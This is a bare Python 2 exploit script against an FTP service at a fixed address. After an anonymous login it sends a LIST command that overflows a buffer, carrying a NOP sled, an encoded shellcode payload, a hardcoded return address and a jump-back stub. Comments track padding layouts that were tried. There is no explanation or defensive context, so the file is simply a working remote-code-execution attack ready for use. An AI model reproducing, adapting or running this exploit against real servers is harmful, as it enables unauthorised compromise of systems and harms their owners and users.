import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('7.7.7.101',21))

s.send('USER anonymous\r\n')

buf = s.recv(1024)

print buf

s.send('PASS anonymous\r\n')

buf = s.recv(1024)

print buf

shellcode=("\xba\xeb\x45\x67\xdc\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x33\x31\x50\x12\x03\x50\x12\x83\x2b\x41\x85\x29\x57" +
"\xa2\xc0\xd2\xa7\x33\xb3\x5b\x42\x02\xe1\x38\x07\x37\x35" +
"\x4a\x45\xb4\xbe\x1e\x7d\x4f\xb2\xb6\x72\xf8\x79\xe1\xbd" +
"\xf9\x4f\x2d\x11\x39\xd1\xd1\x6b\x6e\x31\xeb\xa4\x63\x30" +
"\x2c\xd8\x8c\x60\xe5\x97\x3f\x95\x82\xe5\x83\x94\x44\x62" +
"\xbb\xee\xe1\xb4\x48\x45\xeb\xe4\xe1\xd2\xa3\x1c\x89\xbd" +
"\x13\x1d\x5e\xde\x68\x54\xeb\x15\x1a\x67\x3d\x64\xe3\x56" +
"\x01\x2b\xda\x57\x8c\x35\x1a\x5f\x6f\x40\x50\x9c\x12\x53" +
"\xa3\xdf\xc8\xd6\x36\x47\x9a\x41\x93\x76\x4f\x17\x50\x74" +
"\x24\x53\x3e\x98\xbb\xb0\x34\xa4\x30\x37\x9b\x2d\x02\x1c" +
"\x3f\x76\xd0\x3d\x66\xd2\xb7\x42\x78\xba\x68\xe7\xf2\x28" +
"\x7c\x91\x58\x26\x83\x13\xe7\x0f\x83\x2b\xe8\x3f\xec\x1a" +
"\x63\xd0\x6b\xa3\xa6\x95\x84\xe9\xeb\xbf\x0c\xb4\x79\x82" +
"\x50\x47\x54\xc0\x6c\xc4\x5d\xb8\x8a\xd4\x17\xbd\xd7\x52" +
"\xcb\xcf\x48\x37\xeb\x7c\x68\x12\x88\xe3\xfa\xfe\x61\x86" +
"\x7a\x64\x7e")

print 'shellcode length '
print len(shellcode)

##\xff\xff\xfe\xdc

##10*nop + shellcode(227) + 31*nop
##41*nop + shellcode(227)
##124*nop + shellcode(144)
## 46*nop + shellcode(222)
## 41*nop + shellcode(227)
## 24*nop  + shellcode(244)
## 21*nop  + shellcode(247)
## 37*nop + shellcode(227) + 4*nop
s.send('LIST '+ 37*'\x90' + shellcode + 4*'\x90' + '\xd8\xfc\x93\x7c'+'\x90'*11+'\x83\xc4\x5e'+'\x83\xc4\x5e'+'\x83\xc4\x5e'+'\xe9\xe9\xfe\xff\xff' + '\r\n')

buf = s.recv(1024)

print buf